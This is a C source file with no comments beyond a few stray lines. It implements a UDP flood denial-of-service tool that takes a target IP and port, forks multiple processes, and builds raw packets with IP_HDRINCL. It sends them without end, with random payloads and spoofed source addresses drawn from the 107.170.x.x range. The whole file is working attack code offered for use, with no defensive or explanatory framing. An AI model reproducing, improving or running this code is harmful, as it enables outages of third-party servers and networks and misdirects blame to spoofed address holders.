#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <time.h>

int threads = 8; // threads^

#define MAX_PACKET_SIZE 4096

void setup_ip_header(struct iphdr *iph);
unsigned short csum(unsigned short *buf, int nwords);
uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len);
unsigned long int rand_cmwc(void);
void init_rand(unsigned long int x);
int random_int(int min, int max);
void random_ip(char *ip);
void rand_str(char *str, int len);

int main(int argc, char *argv[])
{
    if (argc < 3)
    {
        fprintf(stdout, "Usage: %s <ip> <port>", argv[0]);
        exit(1);
    }

    for (int i = 0; threads > i; i++) {
        fork();
    }

    struct sockaddr_in sin;

    sin.sin_family = AF_INET;
    sin.sin_port = htons(atoi(argv[2]));
    sin.sin_addr.s_addr = inet_addr(argv[1]);
    
    int sock = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);

    if (sock == -1)
	{
		perror("Error: Failed to create socket!");
		exit(1);
	}

    char datagram[MAX_PACKET_SIZE];
    memset(datagram, 0, MAX_PACKET_SIZE);

    struct iphdr* iph = (struct iphdr*)datagram;
	struct udphdr *udph = (void*)iph + sizeof(struct iphdr);

    //char fiveminfo[15] = "\xff\xff\xff\xff\x67\x65\x74\x69\x6e\x66\x6f\x20\x78\x79\x7a";

    // IPH

    setup_ip_header(iph);
    iph->daddr = sin.sin_addr.s_addr;

    // UDPH

    udph->dest = sin.sin_port;

    int tmp = 1;
    const int *val = &tmp;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0) {
        perror("Error: setsockopt() - Cannot set HDRINCL!");
        exit(1);
    }

    init_rand(time(NULL));

    //(rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
    
    int step = 0;
    //int data_len = sizeof(fiveminfo);

    while (1) {
        int data_len = (rand() % 700) + 16;
        char fiveminfo[data_len];

        char randIP[32];
        random_ip(randIP);

        // IPH
        iph->saddr = inet_addr(randIP);
        iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);

        rand_str(fiveminfo, data_len);
        memcpy((void *)udph + sizeof(struct udphdr), fiveminfo, data_len);

        iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + data_len;
        iph->check = 0;
        iph->check = csum((unsigned short *)datagram, iph->tot_len);

        // UDPH
        udph->source = htons((rand() % 19000) + 28000);
        udph->len = htons(sizeof(struct udphdr) + data_len);
        udph->check = 0;
        udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof (struct udphdr) + data_len);

        sendto(sock, datagram, iph->tot_len, 0, (struct sockaddr*) &sin, sizeof(sin));
    }

    return 0;
}

void setup_ip_header(struct iphdr *iph) {
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->ttl = MAXTTL;
    iph->frag_off = 0;
    iph->protocol = IPPROTO_UDP;
}

unsigned short csum (unsigned short *buf, int count)
{
    register unsigned long sum = 0;
    while( count > 1 ) { sum += *buf++; count -= 2; }
    if(count > 0) { sum += *(unsigned char *)buf; }
    while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
    return (unsigned short)(~sum);
}

uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len)
{
    const uint16_t *buf = buff;
    uint32_t ip_src = iph->saddr;
    uint32_t ip_dst = iph->daddr;
    uint32_t sum = 0;
    int length = len;
    
    while (len > 1)
    {
        sum += *buf;
        buf++;
        len -= 2;
    }

    if (len == 1)
        sum += *((uint8_t *) buf);

    sum += (ip_src >> 16) & 0xFFFF;
    sum += ip_src & 0xFFFF;
    sum += (ip_dst >> 16) & 0xFFFF;
    sum += ip_dst & 0xFFFF;
    sum += htons(iph->protocol);
    sum += data_len;

    while (sum >> 16) 
        sum = (sum & 0xFFFF) + (sum >> 16);

    return ((uint16_t) (~sum));
}

static unsigned long int Q[4096], c = 362436;
unsigned long int rand_cmwc(void) {
    unsigned long long int t, a = 18782LL;
    static unsigned long int i = 4095;
    unsigned long int x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;
    if (x < c) {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}

#define PHI 0x9e3779b9
void init_rand(unsigned long int x)
{
	int i;
	Q[0] = x;
	Q[1] = x + PHI;
	Q[2] = x + PHI + PHI;
	for (i = 3; i < 4096; i++)
	{
		Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
	}
}

int random_int(int min, int max)
{
    int k;
    double d;
    d = (double)rand() / ((double)RAND_MAX + 1);
    k = d * (max - min + 1);
    return min + k;
}

void random_ip(char *ip)
{
    int ip1 = random_int(0, 255);
    int ip2 = random_int(0, 255);

    sprintf(ip, "107.170.%d.%d", ip1, ip2);
}

void rand_str(char *str, int len)
{
    while (len > 0)
    {
        if (len >= 4)
        {
            *((uint32_t *)str) = rand();
            str += sizeof (uint32_t);
            len -= sizeof (uint32_t);
        }
        else if (len >= 2)
        {
            *((uint16_t *)str) = rand() & 0xFFFF;
            str += sizeof (uint16_t);
            len -= sizeof (uint16_t);
        }
        else
        {
            *str++ = rand() & 0xFF;
            len--;
        }
    }
}